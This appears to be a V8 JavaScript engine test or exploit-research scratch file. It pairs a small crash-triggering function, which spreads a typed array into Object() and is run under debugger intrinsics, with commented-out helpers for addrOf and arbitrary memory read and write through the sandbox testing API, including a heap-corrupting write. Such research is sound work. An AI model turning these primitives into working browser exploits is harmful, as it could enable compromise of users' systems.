// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/t5.js

// let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// function addrOf(obj) {
// return Sandbox.getAddressOf(obj);
// }

// function v8_read64(addr) {
// return sandboxMemory.getBigUint64(Number(addr), true);
// }

// function v8_write64(addr, val) {
// return sandboxMemory.setBigInt64(Number(addr), val, true);
// }

// function v8_read32(addr) {
//     // return sandboxMemory.getBigUint32(Number(addr), true);
//     return BigInt(sandboxMemory.getUint32(Number(addr), true));
//     }

// function v8_write32(addr, val) {
// // return sandboxMemory.setBigInt32(Number(addr), val, true);
// return sandboxMemory.setUint32(Number(addr), val, true);
// }

// ============================================================================
function foo() {
  const v11 = new Int8Array(150);
  Object(v11,...v11,v11);
}

foo();
const dummy = new Int8Array(150);
%DebugPrint(dummy);
console.log("=====================================================================");
//   %DebugPrint(foo);
%SystemBreak();

// let v8_heap_base = v8_read64(0x48) - 0x40000n;
// let ofs1 = v8_read32(addrOf(foo)+8); // elements
// v8_write32(ofs1 + 0x298d0bn, 0xffffffff);

foo();